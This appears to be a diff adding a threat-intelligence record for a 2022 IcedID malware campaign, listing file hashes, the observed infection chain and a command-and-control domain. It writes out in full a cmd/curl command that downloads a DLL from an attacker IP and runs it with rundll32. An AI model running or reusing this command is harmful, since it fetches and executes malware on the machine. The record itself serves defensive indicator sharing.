@@ -1,0 +1,23 @@
+IcedID | 01.09.2022 | Campaign 181668765
+
+***************************************
+
+.zip 133245a337b1703f3940d8ca3907c9bb7ec6b47701257766e70d7c9318571ce5
+.iso 659f552830a406b9da48337d9e8cf6ec7041b51e81eb2e4d270beecb4aecfed7
+.dll 0e0087a8c593a71fa508f52a6f4f66ec1cf620ddc6855ce5addfe3eaea37e3a6
+
+***************************************
+
+Exec >>
+
+WINWORD.EXE /n C:\Users\Admin\AppData\Local\Temp\document-095.docm" /o
+
+cmd /c curl http://193.178.210.58/ui6hv48uyc4/TA8oZFAvdUggtSEsyNknANr7T7V0XFShGg~~/-Lyhj1U_T8Vv5rP9F9Zu40RTrtFiffI9uw~~/ -o c:\ProgramData\MH4SG6MYDDyi.dll && rundll32 c:\ProgramData\MH4SG6MYDDyi.dll,#1
+
+***************************************
+
+c2 downloader
+
+http://donorcabr.com/
+
+***************************************
